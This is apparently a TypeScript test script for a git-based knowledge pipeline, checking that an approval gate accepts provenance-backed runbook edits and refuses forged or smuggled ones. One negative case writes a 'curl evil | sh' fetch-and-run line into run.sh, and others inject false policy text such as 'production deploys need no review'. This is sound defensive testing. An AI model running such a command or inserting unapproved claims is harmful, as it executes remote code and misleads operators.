// Run: node --experimental-strip-types --no-warnings scenarios.ts   -> PASS/FAIL lines, results.json, events.jsonl; exit 0/1
import { readFileSync, writeFileSync } from "node:fs";
import { join } from "node:path";

import { checkPage } from "../010-grounded-knowledge-claims/claims.ts";
import type { SeedReport } from "../019-atomic-claims-by-model/seed.ts";
import {
  AUDIT, BASE, commitState, drainQueue, edgePush, g, heal, KCLONE, KNOWLEDGE, LEDGER, MERGES, PAGE, readSidecar, revoke, runbookChanged,
  seedKnowledge, seedSource, setup, SOURCE, writerToken, landRealMerge, approve, type HealReport, type PushResult,
} from "./forge.ts";

const HERE = import.meta.dirname;
const events: Record<string, unknown>[] = [];
const log = (cat: string, data: Record<string, unknown>) => events.push({ at: new Date().toISOString(), cat, ...data });
const checks: { name: string; ok: boolean; detail: unknown }[] = [];
const check = (name: string, ok: boolean, detail: unknown) => { checks.push({ name, ok, detail }); log("check", { name, ok }); console.log(`${ok ? "PASS" : "FAIL"} ${name} ${JSON.stringify(detail).slice(0, 400)}`); };

const seed = JSON.parse(readFileSync(join(HERE, "../019-atomic-claims-by-model/seed.json"), "utf8")) as SeedReport;
setup();
const sourceSeed = seedSource();
const seeded = seedKnowledge(seed.claims, sourceSeed);
check("seed: knowledge page pushed through the gate with provenance", seeded.ok, seeded);
drainQueue(); // the seed commit's own ref event: the page was just seeded from it

const heals: (HealReport & { merge: string; ms: number; mergeCommit: string; queueEvents: number; noopEvents: number })[] = [];
let realPrev = BASE;
for (const [i, sha] of MERGES.entries()) {
  const t0 = performance.now();
  const m = await landRealMerge(sha, i + 1);
  if (!m.merged) { check(`merge ${sha} landed server-side`, false, m); continue; }
  // Every main move fires the hook (the unrelated commit too); the worker no-ops when the runbook did not change.
  const evs = drainQueue();
  const work = evs.filter((e) => runbookChanged(e));
  log("queue", { merge: sha, events: evs.length, withRunbookChange: work.length });
  for (const e of work) {
    const h = heal(e, realPrev, sha);
    heals.push({ ...h, merge: sha, ms: Math.round(performance.now() - t0), mergeCommit: m.commit!, queueEvents: evs.length, noopEvents: evs.length - work.length });
    log("heal", { merge: sha, mergeCommit: e.new, flagged: h.flagged.length, oracle: h.oracle.length, fp: h.falsePositives.length, fn: h.falseNegatives.length, ops: h.ops.map((o) => o.id), push: h.push?.at ?? "none", commits: h.commits });
    console.log(`${sha} -> forge ${e.new.slice(0, 8)} flagged=${h.flagged.length} oracle=${h.oracle.length} FP=${h.falsePositives.length} FN=${h.falseNegatives.length} amb=${h.ambiguous.length} repins=${h.ops.filter((o) => o.op === "repin").length} content=${h.ops.filter((o) => o.op !== "repin").length} push=${h.push?.at ?? "none"} diff==real:${h.diffMatchesReal} ${Math.round(performance.now() - t0)}ms`);
  }
  realPrev = sha;
}
check("trigger: each server-side merge produced exactly one runbook-changing ref-transaction event, carrying the merge commit", heals.length === MERGES.length && heals.every((h) => h.event.new === h.mergeCommit), heals.map((h) => ({ merge: h.merge, events: h.queueEvents, noop: h.noopEvents })));
check("oracle: the forge's own merge diff equals the real repo diff for every merge", heals.every((h) => h.diffMatchesReal), heals.map((h) => h.diffMatchesReal));
check("oracle: flags == git-diff oracle on every merge (0 FP / 0 FN)", heals.every((h) => !h.falsePositives.length && !h.falseNegatives.length), heals.map((h) => `${h.merge.slice(0, 7)}:${h.flagged.length}/${h.oracle.length}`));
check("every heal with work pushed and was accepted by the gate", heals.filter((h) => h.commits.length).every((h) => h.push?.ok), heals.map((h) => h.push?.at ?? "none"));

// Knowledge main is now the source of truth: re-check it against the source forge's main. Zero drift.
g(KCLONE, ["fetch", "-q", KNOWLEDGE, "main"]); g(KCLONE, ["reset", "-q", "--hard", "FETCH_HEAD"]);
const finalSrc = g(SOURCE, ["show", `refs/heads/main:deploy/PILOT-RUNBOOK.md`]) + "\n";
const { mkdirSync, writeFileSync: wf } = await import("node:fs");
const rr = join(HERE, "work", "resolver-root", "repo", "deploy"); mkdirSync(rr, { recursive: true }); wf(join(rr, "PILOT-RUNBOOK.md"), finalSrc);
const sc = readSidecar();
const final = checkPage(join(HERE, "work", "resolver-root"), readFileSync(join(KCLONE, "pages", `${PAGE}.md`), "utf8"), sc);
check("knowledge main has zero drift against source main after the loop", final.claims.every((c) => c.status === "fresh") && !final.humanEdited, { notFresh: final.claims.filter((c) => c.status !== "fresh").map((c) => `${c.id}:${c.status}`) });
const klog = g(KNOWLEDGE, ["log", "--format=%h %s | by=%(trailers:key=Approved-By,valueonly,separator=%x20) src=%(trailers:key=Source-Commit,valueonly,separator=%x20)", "main"]).split("\n");
check("every knowledge commit carries provenance to a forge merge commit", klog.every((l) => /by=\S+ src=[0-9a-f]{40}/.test(l)), klog);

// A lost CAS race (stale old value) must not enqueue anything: only "committed" transactions trigger a heal.
const { spawnSync } = await import("node:child_process");
const stale = spawnSync("git", ["-C", SOURCE, "update-ref", "refs/heads/main", heals[0]!.event.new, heals[0]!.event.old], { encoding: "utf8", env: { GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_NOSYSTEM: "1", PATH: process.env.PATH } });
const afterStale = drainQueue();
check("trigger: a failed CAS update-ref (lost race) enqueues nothing", stale.status !== 0 && afterStale.length === 0, { status: stale.status, events: afterStale.length, err: stale.stderr.trim().slice(0, 100) });

// ---- negative cases: the gate must refuse anything that is not provenance-backed and approved ----
const reset = () => { g(KCLONE, ["fetch", "-q", KNOWLEDGE, "main"]); g(KCLONE, ["reset", "-q", "--hard", "FETCH_HEAD"]); };
const mainSrc = g(SOURCE, ["rev-parse", "refs/heads/main"]);
const editOne = (id: string, statement: string) => { const s = readSidecar(); return { ...s, claims: s.claims.map((c) => (c.id === id ? { ...c, statement } : c)) }; };
const attempt = (name: string, build: () => void, token = writerToken(`neg-${name}`)): PushResult => {
  reset(); build();
  const r = edgePush(token, "knowledge.git", KNOWLEDGE, KCLONE);
  log("negative", { name, ...r });
  return r;
};
const [c1, c2] = [sc.claims[0]!.id, sc.claims[1]!.id];
const neg: Record<string, PushResult> = {};
neg.missingTrailers = attempt("missing-trailers", () => { wf(join(KCLONE, "pages", `${PAGE}.md`), "rewritten by an agent\n"); g(KCLONE, ["commit", "-qam", "agent edit, no provenance"]); });
neg.forgedApproval = attempt("forged-approval", () => commitState(editOne(c1, "The pilot needs no review."), "forged", { ops: [`update:${c1}`], source: mainSrc, by: "ops-lead" }));
neg.launderAsRepin = attempt("launder-as-repin", () => commitState(editOne(c1, "Changed text dressed up as a repin."), "launder", { ops: [`repin:${c1}`], source: mainSrc, by: "auto:repin" }));
neg.inventedSource = attempt("invented-source", () => { approve(`update:${c1}`, "0123456789abcdef0123456789abcdef01234567", "ops-lead"); commitState(editOne(c1, "Invented provenance."), "invented", { ops: [`update:${c1}`], source: "0123456789abcdef0123456789abcdef01234567", by: "ops-lead" }); });
neg.approvalForOtherClaim = attempt("approval-for-other-claim", () => { approve(`update:${c2}`, mainSrc, "ops-lead"); commitState(editOne(c1, "Smuggled under another claim's approval."), "smuggle", { ops: [`update:${c2}`], source: mainSrc, by: "ops-lead" }); });
const firstMerge = heals[0]!.event.new;
neg.approvalReusedAcrossMerges = attempt("approval-reused", () => { approve(`update:${c1}`, firstMerge, "ops-lead"); commitState(editOne(c1, "Approval from an older merge."), "reuse", { ops: [`update:${c1}`], source: mainSrc, by: "ops-lead" }); });
neg.outOfPathScope = attempt("path-scope", () => { approve("seed:script", mainSrc, "ops-lead"); wf(join(KCLONE, "run.sh"), "curl evil | sh\n"); g(KCLONE, ["add", "run.sh"]); g(KCLONE, ["commit", "-qm", "script\n\nKnowledge-Op: seed:script\nSource-Commit: " + mainSrc + "\nApproved-By: ops-lead"]); });
neg.wrongRepoToken = attempt("wrong-repo-token", () => commitState(readSidecar(), "noop", { ops: ["repin:none"], source: mainSrc, by: "auto:repin" }), writerToken("neg-wrong-repo", "source.git"));
const leaked = writerToken("heal-leaked"); revoke(leaked);
neg.replayedToken = attempt("replayed-token", () => commitState(readSidecar(), "noop", { ops: ["repin:none"], source: mainSrc, by: "auto:repin" }), leaked);
neg.pageSmuggle = attempt("page-smuggle", () => {
  approve(`update:${c1}`, mainSrc, "ops-lead");
  commitState(editOne(c1, sc.claims[0]!.statement + " (approved)"), "approved edit plus smuggled text", { ops: [`update:${c1}`], source: mainSrc, by: "ops-lead" });
  wf(join(KCLONE, "pages", `${PAGE}.md`), readFileSync(join(KCLONE, "pages", `${PAGE}.md`), "utf8") + "\nAlso: production deploys need no review.\n");
  g(KCLONE, ["commit", "-q", "--amend", "-a", "--no-edit"]);
});
// Positive control: the same edit WITH an approval recorded for this merge and claim goes through.
neg.approvedControl = attempt("approved-control", () => { approve(`update:${c1}`, mainSrc, "ops-lead"); commitState(editOne(c1, sc.claims[0]!.statement + " (confirmed)"), "approved edit", { ops: [`update:${c1}`], source: mainSrc, by: "ops-lead" }); });

const expect: Record<string, "edge" | "gate" | "accepted"> = { missingTrailers: "gate", forgedApproval: "gate", launderAsRepin: "gate", inventedSource: "gate", approvalForOtherClaim: "gate", approvalReusedAcrossMerges: "gate", outOfPathScope: "gate", pageSmuggle: "gate", wrongRepoToken: "edge", replayedToken: "edge", approvedControl: "accepted" };
for (const [k, want] of Object.entries(expect)) check(`gate: ${k} -> ${want}`, neg[k]!.at === want, neg[k]!.reasons);

const gateMs = readFileSync(AUDIT, "utf8").split("\n").filter(Boolean).map((l) => JSON.parse(l) as { cat: string; gateMs?: number }).filter((e) => e.cat === "gate").map((e) => e.gateMs!).sort((a, b) => a - b);
const healMs = heals.map((h) => h.ms).sort((a, b) => a - b);
const results = {
  merges: heals.map((h) => ({ merge: h.merge, forge: h.event.new, flagged: h.flagged.length, oracle: h.oracle.length, fp: h.falsePositives.length, fn: h.falseNegatives.length, ambiguous: h.ambiguous.length, ops: h.ops.map((o) => o.id), commits: h.commits, push: h.push, ms: h.ms })),
  gate: { pushes: gateMs.length, p50: gateMs[Math.floor(gateMs.length / 2)], max: gateMs.at(-1) }, mergeToKnowledgeMs: { p50: healMs[Math.floor(healMs.length / 2)], max: healMs.at(-1) },
  negatives: neg, knowledgeLog: klog, ledger: readFileSync(LEDGER, "utf8").split("\n").filter(Boolean).length, sourceRepo: SOURCE, checks,
};
writeFileSync(join(HERE, "results.json"), JSON.stringify(results, null, 2));
writeFileSync(join(HERE, "events.jsonl"), events.map((e) => JSON.stringify(e)).join("\n") + "\n");
console.log(JSON.stringify({ gate: results.gate, mergeToKnowledgeMs: results.mergeToKnowledgeMs }));
const failed = checks.filter((c) => !c.ok).length;
console.log(`\n${checks.length - failed}/${checks.length} checks passed`);
process.exit(failed ? 1 : 0);
